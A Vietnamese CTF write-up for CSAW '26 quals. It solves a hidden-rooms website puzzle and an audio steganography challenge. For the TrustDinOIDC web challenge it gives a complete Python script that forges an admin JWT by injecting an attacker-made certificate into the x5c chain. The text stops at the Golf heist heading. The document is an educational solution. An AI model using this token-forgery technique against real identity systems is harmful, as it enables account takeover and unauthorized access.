---
title: CSAW' 26 QUALS

---

# Misc
## House of Hollow Houses
##### Đề bài
A labyrinth of "hollow" rooms served as a static website — each room links to others, and the flag lies waiting in the sanctum. Players wander the interlinked rooms (and read what the pages are quietly telling them) to find the way in. Hosted service on port 8000.

https://hollow-houses.ctf.csaw.io/
##### Solution 
#### Trang chủ
Đây là một bài ctf thú vị được giải mã thông qua việc người lần lượt truy cập các đường URL được ẩn giấu trong lời mô tả của trang

Ta nhận thấy đây là một trang web có chứa thông tin về các phòng với các font chữ khác nhau và rất nhiều đường link URL nhằm gây nhiễu user

Trước tiên, ta thử craw các đường dẫn URL của website với
1. Googlebot: sử dụng `site:hollow-houses.ctf.csaw.io/`.
Không trả về kết quả gì.
2. `https://hollow-houses.ctf.csaw.io/sitemap.xml` là một file XML mà website dùng để liệt kê các URL quan trọng của mình, chủ yếu để các search engine như Google/Bing dễ phát hiện và lập chỉ mục.
Kết quả trả về là 404.

Ta quay trở lại với việc làm thủ công và đọc trang web, phát hiện được đoạn văn đáng ngờ `The obedient have always been answered first, and the answer issued to them is a catalogue, organised alphabetically, of every place the atrium is not. The catalogue is, by long custom, kept at the front gate, in a small text file the house permits to be read by anyone who knows to ask for it. It is, of course, a complete list.` 
Trong challenge này có hai dấu hiệu kết hợp:
1. `the obedient`
→ gợi đến crawler/bot.
3. `at the front gate, in a small text file`
→ một file text ở root/front gate.

Vậy ta phải truy cập [/robots.txt/](https://hollow-houses.ctf.csaw.io/robots.txt)
#### Kẻ phục tùng (The obedient)
với [robots.txt](https://www.cloudflare.com/learning/bots/what-is-robots-txt/#how-does-a-robotstxt-file-work) là một file chuẩn đặt ở root của website: https://hollow-houses.ctf.csaw.io/robots.txt

Kết quả trả về:
```!
User-agent: *
Disallow: /atrium/

# the obedient have been answered.
```

Vì ở đây `Disallow: /atrium/` chứng tỏ rằng `/atrium/` là 1 đường dẫn URL quan trọng, ta đã tìm được căn phòng tiếp theo

-> Ta truy cập đường dẫn [/atrium/](https://hollow-houses.ctf.csaw.io/atrium/)

#### Giếng trời (Atrium)


```html!
<p>
    <span class="h">O</span>
    ften the visitors look only at what shines. They are escorted, gently, back to the threshold, and the house arranges for them to remember nothing of the visit.
</p>
<p>
    <span class="h">S</span>
    ometimes a word holds another word inside it, the way a coffin holds a coffin, the way a room holds a room.
</p>
<p>
    <span class="h">S</span>
    elect what you cannot see. This is the instruction the house gives most often, and which the visitors most often decline.
</p>
<p>
    <span class="h">U</span>
    nder every floor is a floor. Under that floor is a name. Under the name is the person the name once belonged to.
</p>
<p>
    <span class="h">A</span>
    sk the room what it is, and the room, on a good day, will tell you. Ask politely. Ask in lower case.
</p>
<p>
    <span class="h">R</span>
    ooms are not buildings. Rooms are sentences. You are reading one now.
</p>
<p>
    <span class="h">Y</span>
    ou are nearly through. The next chamber is named for what we keep when there is nothing else left.
</p>
```

Ta thấy chữ cái đầu tiên của mỗi dòng đều được cố ý làm mờ gần với màu tường rất đáng ngờ
-> Ta truy cập đường dẫn [/ossuary/](https://hollow-houses.ctf.csaw.io/ossuary/)

#### Nơi chôn cất (Ossuary)
Trang này có chứa một đoạn mật mã khó hiểu và đáng ngờ ở giữa trang
`d2hhdCB0aGUgbWlycm9yIHNlZXMsIHRoZSBtaXJyb3Iga2VlcHM=`

Ngoài ra còn có gợi ý về cách giải mã ở cuối 
`sixty-four letters in the alphabet of refusal. one room in the answer.`
Ta liền nghĩ đến ngay `Base 64`

Truy cập [CyberChef](https://gchq.github.io/CyberChef/) và thử decode đoạn mật mã này
![image](https://hackmd.io/_uploads/rkkGvSAYMg.png)

Trong trang đã nói rất rõ về chỉ dẫn đến căn phòng tiếp theo:
`The rite, on decoding, is a sentence.
The sentence contains a noun.
The noun is the name of the next room.`

Mà ở trong câu `what the mirror sees, the mirror keeps` có noun chính là `mirror`
-> Ta truy cập đường dẫn [/mirror/](https://hollow-houses.ctf.csaw.io/mirror/)
#### Chiếc gương (Mirror)
Ở trang này tất cả các chữ cái đều bị lật ngược lại

Vì vậy ta đọc source để xem thông tin của trang, nhận thấy trang này đã chỉ rõ room tiếp theo
```html!
<p>
The next chamber is called the
<a href="/wellspring/">wellspring</a>.
It lies beneath this one, in a sense that has nothing to do with elevation.
Knock once, in lower case. Enter.
Do not speak above the water.
</p>
```
-> Ta truy cập đường dẫn [/wellspring/](https://hollow-houses.ctf.csaw.io/wellspring/)
#### Suối nguồn (Wellspring)
Khi xem trang, ta nhận thấy mỗi dòng câu đều có những khoảng cách kì lạ và có tần suất lặp lại riêng biệt 

Ta liên tưởng đến mật mã Morse:
- Trong mỗi dòng:
    1. 1 space giữa hai từ → `.`
    2. 3 spaces → `-`
- Mỗi dòng tương ứng với một ký tự Morse
- Dòng trống → ngăn cách các từ

Decode toàn bộ ta thu được kết quả sau 
`THE FLAG LIES WAITING IN THE SANCTUM`

Ta truy cập đường dẫn [/sanctum/](https://hollow-houses.ctf.csaw.io/sanctum/)
#### Thánh địa (Sanctum)
Đến trang này thì ta thu được flag: 
`csaw{w4nd3r3r_0f_th3_h0ll0w_h0us3}`

>Funfact: đề bài đã mô tả rằng flag nằm ở `sanctum`.
>`"the flag lies waiting in the sanctum"`
## 12345678!
#### Đề bài 
listen....when you find the answer it will glisten.....
File: [12345678.wav](https://github.com/Drakie14/Challenges/blob/CSAW'-26-QUALS/12345678.wav)
#### Solution 
Ta sử dụng `Audacity` để mở file
![image](https://hackmd.io/_uploads/rklVV0J9Mg.png)

Ta `duplicate` và đổi `track visualization` thành `spectrogram` để kiểm tra
![image](https://hackmd.io/_uploads/BJhcVAJqze.png)

Phát hiện được đoạn mật mã sau: `dV9uMzNkXw==` 
![image](https://hackmd.io/_uploads/S1PRQC1qfg.png)

Ta dễ dàng nhận ra đây là đoạn mã được Base64 encode. Sau khi decode ta thu được: `u_n33d_`
![image](https://hackmd.io/_uploads/By1o66J9ze.png)

Sau đó, lắng nghe đoạn audio và nhận ra 
đoạn âm thanh từ 3s->22s nghe như âm thanh bị reverse

Sau khi reverse thì có file [12345678_reversed.wav](https://github.com/Drakie14/Challenges/blob/CSAW'-26-QUALS/12345678_reversed.wav) sau
Ta nghe được có người nói rằng: “2 parts `1n_0rd3r_`”

Kiểm tra metadata của file thì ta có được chuỗi Base64-encoded khác
![image](https://hackmd.io/_uploads/ByKS9CJ5Ml.png)
Decode ta có được: `2_5t3@1_`

Sau khi tìm ra 3 phần của flag thì ta thấy ở mỗi phần đều có `_` ở cuối nên chứng tỏ vẫn chưa kết thúc

Ta thử `amplify` file gốc và nhận thấy từ 25s->35s có người nói gì đó nhưng với pitch rất cao 

Ta giảm pitch của đoạn đó xuống thu được file [12345678bit](https://github.com/Drakie14/Challenges/blob/CSAW'-26-QUALS/12345678bit.wav) và nghe ra `2_f1nd`

Vậy là đã tìm được phần kết thúc, giờ ta phải ghép lại thành câu có nghĩa 

-> Flag: `csaw{1n_0rd3r_2_5t3@1_u_n33d_2_f1nd}`
# Web
## TrustDinOIDC
#### Đề bài
TrustDinOIDC sells dinosaur posters to anyone who can prove they're logged in. The Flagosaurus print is for admins only.

https://dino2auth.ctf.csaw.io/
#### Solution
Truy cập website, ta có giao diện sau và có thể login vào 1 trong 2 provider
![image](https://hackmd.io/_uploads/SkP9lllqzx.png)

Ta thử login thông qua cả 1 provider và lấy về  [JWT](https://viblo.asia/p/json-web-token-la-gi-aWj533go56m#C%E1%BA%A5u-tr%C3%BAc-JSON-Web-Token) của provider đó, sau đó decode bằng [JWT decoder](https://www.jwt.io/):

Ta thử với `strataid`:
:::spoiler
Ta có JWT (Json Web Token), decode được:
Header: 
```json!
{
  "alg": "RS256",
  "typ": "JWT",
  "x5c": 
    [ "MIICyjCCAbKgAwIBAgIUbCHTqaYloj+/94bnREhCnTfWSbcwDQYJKoZIhvcNAQELBQAwHzEdMBsGA1UEAwwUc3RyYXRhaWQuZXhhbXBsZS5jb20wHhcNMjYwOTIwMTcwOTEzWhcNMjcwOTIwMTcwOTEzWjAfMR0wGwYDVQQDDBRzdHJhdGFpZC5leGFtcGxlLmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKzTVY2FTb+5805ipIC+HMT3TucM1ou6jRCdnJtTF/Vx8gKT4KoIkyMHDqbos7WDkNB2o2rw2uxyLpPybSd5JCGdqkLgijGclh4EiWXI+gZHqwG7ekpn0Ocxd1AvavUy/Q73dJFsQ9RnyTGjA242luDlBNQ/TXWv+WerHnGPDGrMTuOKp0ogKd9y/LVDWq3O+UXOtuUL0s/LDTf/Gev/MjLX7/K/c5GARuJI7s3lvfkWL2zo3qexIiEMBzAWYPbq7wSd5TgRGxbzXEudju6a/5GV+xhLdiDCUYg+rzbxq8WkUGc1QV7um5VyAAcVgYH3HgUwxkME9kFEg0JCnyrx8a0CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAGBIx/hyXqVsYus2tajYevQhk0GqNY9uAgP2uoLqbDM6VYmg9t3Gm9qlewcMXlO9A3WbuUlnIno1YhlRGsdiN5D9H2Vx4e598cBBrs2Gc715lUUBD+dG1+nVg+BKR0ESeSTZlr//WAae8oRrIuWPDxh9G3Uu++p1tSNHzlFch0VcXJtfZFPIqe780x4P/WR522MNHomw+ORUw2j4Fi+HZg5CvT+zFThEiyLCqhfCFWEU7QGHkIRFwJj5J7TQfFNGiv7EuWWiXfNds3Z7MJJGzYeXti5g2dk8zmndD8XqqT3UFnZNvaDYGtJAa8txl1u52mSUVoLlENkygKqsmTfdrEA=="
  ]
}
```
Payload:
```json!
{
  "iss": "strataid.example.com",
  "sub": "guest",
  "aud": "trustdinoidc-portal",
  "scope": "openid profile freeosaurus:redeem",
  "exp": 1790129062
}
```
Signature verification: Public Key
```json!
{
  "e": "AQAB",
  "kty": "RSA",
  "n": "rNNVjYVNv7nzTmKkgL4cxPdO5wzWi7qNEJ2cm1MX9XHyApPgqgiTIwcOpuiztYOQ0HajavDa7HIuk_JtJ3kkIZ2qQuCKMZyWHgSJZcj6BkerAbt6SmfQ5zF3UC9q9TL9Dvd0kWxD1GfJMaMDbjaW4OUE1D9Nda_5Z6secY8MasxO44qnSiAp33L8tUNarc75Rc625QvSz8sNN_8Z6_8yMtfv8r9zkYBG4kjuzeW9-RYvbOjep7EiIQwHMBZg9urvBJ3lOBEbFvNcS52O7pr_kZX7GEt2IMJRiD6vNvGrxaRQZzVBXu6blXIABxWBgfceBTDGQwT2QUSDQkKfKvHxrQ"
}
```
:::


Để lấy được flag trong flagosaurus, ta cần có quyền admin
-> cần phải chuyển từ `"sub": "guest"`-> `"sub": "admin"`
-> Tạo JWT giả và chèn payload `"sub":"admin"`

Vậy ta sẽ muốn tạo 1 JWT chứa payload của attacker

Trong JWT có `"x5c":[certificate]`, với `x5c` viết tắt cho [X.509 certificate](https://viblo.asia/p/x509-certificate-duoc-su-dung-hang-ngay-3P0lPqbG5ox).

Để đọc được thông tin của X.509 certificate, ta cần phải decode từ Base64-> DER và đọc DER
Dùng OpenSSL:
```Bash!
# base64_x5c → DER
echo 'BASE64_X5C' | base64 -d > cert.der

# DER → đọc X.509
openssl x509 -inform DER -in cert.der -text -noout
```

Ta decode certificate của strataid thu được
```!
Certificate
├── Version
│   └── v3
├── Serial Number
│   └── 0x6c21d3a9a625a23fbff786e74448429d37d649b7
├── Subject
│   └── CN=strataid.example.com
├── Issuer
│   └── CN=strataid.example.com
├── Validity
│   ├── Not Before: 2026-09-20 17:09:13 UTC
│   └── Not After : 2027-09-20 17:09:13 UTC
├── Public Key
│   ├── Type: RSA
│   ├── Size: 2048 bits
│   └── Exponent: 65537
└── Certificate Signature
    └── SHA256 + RSA
```

=> Nhận thấy `issuer`==`subject`
=> Certificate này khai Strataid là đối tượng được cấp và cũng là bên cấp, là một dấu hiệu đáng ngờ của `self-signed certificate`

Muốn xác nhận cryptographically, ta cần kiểm tra certificate có thể tự verify bằng chính `public key` của nó hay không.

Để kiểm tra certificate có tự kí không, ta cần phải chuyển từ DER về PEM và verify
```bash!
# DER → PEM
openssl x509 -inform DER -in cert.der -out cert.pem

# Verify
openssl verify -CAfile cert.pem cert.pem.
```

Thu được `cert.pem: OK`, vậy ta biết đây là một `self-signed certificate`

Certificate của provider là self-signed, cho thấy hệ thống có thể sử dụng một trust model không dựa trên chuỗi CA bên ngoài thông thường. Vì vậy, một hướng điều tra hợp lý là thử tạo một `self-signed certificate` với `key pair` do attacker kiểm soát.

Sau đó tạo JWT giả và kí với `private key` mà attacker kiểm soát 

Sau khi thử nhập JWT với `headers={"x5c": [attacker_cert]}` mà không có `trusted cert`, Nhận thấy web vẫn coi ta chưa login

Điều này cho thấy: `JWT signature = hợp lệ`
nhưng: `attacker certificate = chưa được server trust`

=> Vấn đề không nằm ở cryptography mà nằm ở trust validation.

Ta chỉnh lại `solve.py`
```
x5c
├── attacker certificate
│       ↓
│   attacker public key
│       ↓
│   verify JWT
│
└── trusted certificate
        ↓
   server đánh dấu trusted
```
->Flag: `csaw{str4ta_sk1pped_th3_p1n}`
![image](https://hackmd.io/_uploads/BJ75UHM5Ge.png)

Code đầy đủ solve:
```python!
import base64
import datetime
import json
import re
from pathlib import Path

import jwt
import requests
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID

BASE = "https://dino2auth.ctf.csaw.io"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
}

def get_idp_cert(provider):
    r = requests.get(
        f"{BASE}/idp/{provider}/authorize",
        params={
            "client_id": "trustdinoidc-portal",
            "redirect_uri": f"{BASE}/oauth/callback",
            "scope": "openid profile freeosaurus:redeem",
            "state": "solve",
        },
        headers=HEADERS,
        timeout=15,
    )
    token = re.search(r'name="id_token" value="([^"]+)', r.text).group(1)
    header = json.loads(base64.urlsafe_b64decode(token.split(".")[0] + "=="))
    return header["x5c"][0]


def make_attacker_cert(key, issuer):
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, issuer)])
    cert = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(minutes=1))
        .not_valid_after(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=365))
        .sign(key, hashes.SHA256())
    )
    return base64.b64encode(cert.public_bytes(serialization.Encoding.DER)).decode()


issuer = "strataid.example.com"
trusted_cert = get_idp_cert("strataid")
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
attacker_cert = make_attacker_cert(key, issuer)
claims = {
    "iss": issuer,
    "sub": "admin",
    "aud": "trustdinoidc-portal",
    "scope": "openid profile freeosaurus:redeem flagosaurus:redeem",
    "exp": int(datetime.datetime.now(datetime.timezone.utc).timestamp()) + 3600,
}
token = jwt.encode(
    claims,
    key,
    algorithm="RS256",
    headers={"x5c": [attacker_cert, trusted_cert]},
)
Path("session-cookie.txt").write_text(token + "\n")

page = requests.get(
    f"{BASE}/",
    headers=HEADERS,
    cookies={"session": token},
    timeout=15,
)
page.raise_for_status()
flag = re.search(r"[A-Za-z0-9_]+\{[^{}]+\}", page.text)
if not flag:
    raise RuntimeError("flag not found")

path = Path("flag.txt")
if not path.exists():
    path.write_text(flag.group(0) + "\n")
    print("flag saved to flag.txt")
else:
    print("flag.txt already exists; not overwritten")
print("fresh cookie saved to session-cookie.txt")
```

## Golf heist
#### Đề bài
Avispa Country Club is where old money like Woozie and Ryder think their vault is untouchable. But the caddy carries everything for them - keys, secrets, headers... and he doesn't check what's in the bag.

Word is, there's a Golden Putter in that vault. One of one. All you have to do is find the right numbers, speak the right words, and let the caddy do the rest - the caddy always does.
https://golf-heist.ctf.csaw.io/
File: [golf-heist.zip](https://github.com/Drakie14/Challenges/blob/CSAW'-26-QUALS/golf-heist.zip)
#### Solution 
